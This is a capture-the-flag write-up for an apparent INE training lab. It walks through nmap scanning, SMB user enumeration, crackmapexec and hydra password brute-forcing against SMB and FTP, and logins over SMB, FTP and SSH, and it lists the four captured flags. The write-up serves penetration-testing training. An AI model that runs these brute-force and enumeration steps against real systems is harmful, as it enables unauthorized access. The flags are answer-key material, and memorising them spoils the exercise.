# Target Info
*IP*: `192.144.62.3`
*Domain*; `target.ine.local`

# flags
1) FLAG1_{76ac83e918784ebc8b130c46066da9b2}
2) FLAG2_{b42d32fc886544f9b8a1b61362832424}
3) FLAG3_{841484fe302c41539a80f922e381466e}
4) FLAG4_{afc8b6166cdb43359b6fa0f6b54b7752}
# Enumeration
## Host discovery
```shell
nmap -sn 192.144.62.2/24
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-12 18:45 IST
Nmap scan report for 192.144.62.1
Host is up (0.000071s latency).
MAC Address: 02:42:13:70:DE:BC (Unknown)
Nmap scan report for target.ine.local (192.144.62.3)
Host is up (0.000043s latency).
MAC Address: 02:42:C0:90:3E:03 (Unknown)
Nmap scan report for INE (192.144.62.2)
Host is up.
Nmap done: 256 IP addresses (3 hosts up) scanned in 1.99 seconds
```
## Port scan
```shell
- sudo nmap --min-rate 10000 -p- target.ine.local

PORT     STATE SERVICE

22/tcp   open  ssh
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
5554/tcp open  sgi-esphttp

MAC Address: 02:42:C0:90:3E:03 (Unknown)
```
## Service Enumeration
```shell
- sudo nmap -sS -sV -A -T4 -p22,139,445,5554 target.ine.local

PORT     STATE SERVICE     VERSION

22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 bb:ca:49:7e:f5:5c:6e:bf:8a:55:a1:69:d9:c9:18:01 (RSA)
|   256 da:06:c1:ab:e7:6f:14:b9:50:d5:43:a7:47:ab:80:ce (ECDSA)
|_  256 a1:5c:ab:22:6b:c2:f1:5c:5a:7a:5a:d8:e7:81:e2:33 (ED25519)

139/tcp  open  netbios-ssn Samba smbd 4.6.2

445/tcp  open  netbios-ssn Samba smbd 4.6.2

5554/tcp open  ftp         vsftpd 2.0.8 or later

MAC Address: 02:42:C0:90:3E:03 (Unknown)

Warning: OSScan results may be unreliable because we could not find at least 1 
open and 1 closed port
Aggressive OS guesses: Linux 2.6.32 (96%), Linux 3.2 - 4.9 (96%), Linux 4.15 - 5.8 (96%), Linux 2.6.32 - 3.10 (96%), Linux 5.0 - 5.5 (96%), Linux 3.4 - 3.10 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), Synology DiskStation Manager 5.2-5644 (94%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: Host: blah; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2025-05-12T13:20:20
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: TARGET, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)

TRACEROUTE
HOP RTT     ADDRESS
1   0.11 ms target.ine.local (192.144.62.3)
```
### SMB user Enum
```shell
- enum4linux target.ine.local
- 
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''

S-1-22-1-1000 Unix User\josh (Local User)
S-1-22-1-1001 Unix User\bob (Local User)
S-1-22-1-1002 Unix User\nancy (Local User)
S-1-22-1-1003 Unix User\alice (Local User)
# extract users in users.txt file
```
# Exploitation
## **Exploiting SMB**
-> *wordlists used*:  /root/Desktop/wordlists 
### *BruteForce attack*
``` shell
# standalone 
- crackmapexec smb  target.ine.local -u josh  -p unix_passwords.txt | grep -e '[+]'

SMB target.ine.local 445 TARGET  [+] ine.local\josh:purple
					`or`
# by using for loop and users.txt  
- for i in $(cat users.txt);do crackmapexec smb  target.ine.local -u $i -p unix_passwords.txt | grep -e '[+]' ; done

SMB    target.ine.local 445    TARGET  [+] ine.local\josh:purple
SMB    target.ine.local 445    TARGET  [+] ine.local\alice:admin
# found 2 users..
```

`accessing smb`
```shell
# using impacket
- impacket-smbclient josh:purple@target.ine.local 
use josh
ls
cat flag.txt

# using smbclient
- smbclient  //target.ine.local/josh -U josh
- ls
- more flag2.txt
- FLAG2{b42d32fc886544f9b8a1b61362832424}
- Psst! I heard there is an FTP service running. Find it and check the banner.
```

### *Bruteforce shares*
```shell
- for i in $(cat shares.txt );do echo $i; smbclient //target.ine.local/$i -N -c "ls" 2>/dev/null;done 
pubfiles
  .                                   D        0  Mon May 12 18:43:18 2025
  ..                                  D        0  Tue Nov 19 10:44:41 2024
  flag1.txt                           N       40  Mon May 12 18:43:18 2025

                1981311780 blocks of size 1024. 85772160 blocks available

# access share
- smbclient //target.ine.local/pubfiles 
	- ls 
	- more flag1.txt
```
-> got share access `pubfiles` with `flag1.txt`


## **Exloiting FTP**
### Enumerating 
```shell
- ftp target.ine.local -P 5554
Connected to target.ine.local.
220 Welcome to blah FTP service. Reminder to users, specifically ashley, alice and amanda to change their weak passwords immediately!!!
```

### Bruteforce
```shell
# extract users from banner and save in file
# cat ftpusers
ashley
alice
amanda

# hydra 
- hydra -L ftpusers -P unix_passwords.txt -t 25 ftp://target.ine.local:5554

[5554][ftp] host: target.ine.local   login: alice   password: pretty 
```
 
 *Accessing FTP*
```shell
ftp target.ine.local -P 5554
Connected to target.ine.local.
220 Welcome to blah FTP service. Reminder to users, specifically ashley, alice and amanda to change their weak passwords immediately!!!
Name (target.ine.local:root): alice
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||9095|)
150 Here comes the directory listing.
-rw-rw-r--    1 0        0              40 May 12 13:13 flag3.txt
226 Directory send OK.
ftp> more flag3.txt
FLAG3{841484fe302c41539a80f922e381466e}
ftp> 
```
## **Exploiting ssh**
-> after enumerating ssh by found users just found out password less login and flag
```shell
- ssh josh@target.ine.local
The authenticity of host 'target.ine.local (192.144.62.3)' can't be established.
ED25519 key fingerprint is SHA256:qWHJnmTFgrmLKFbmMNRLIr1Y8MVWpqGGxhJ5miFHgnQ.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'target.ine.local' (ED25519) to the list of known hosts.
********************************************************************
*                                                                  *
*            WARNING: Unauthorized access to this system           *
*            is strictly prohibited and may be subject to          *
*            criminal prosecution.                                 *
*                                                                  *
*            This system is for authorized users only.             *
*            All activities on this system are monitored           *
*            and recorded.                                         *
*                                                                  *
*            By accessing this system, you consent to              *
*            such monitoring and recording.                        *
*                                                                  *
*            If you are not an authorized user,                    *
*            disconnect immediately.                               *
*                                                                  *
********************************************************************
*                                                                  *
*    Is this what you're looking for?: FLAG4{afc8b6166cdb43359b6fa0f6b54b7752}       *
*                                                                  *
********************************************************************
josh@target.ine.local's password: 

```
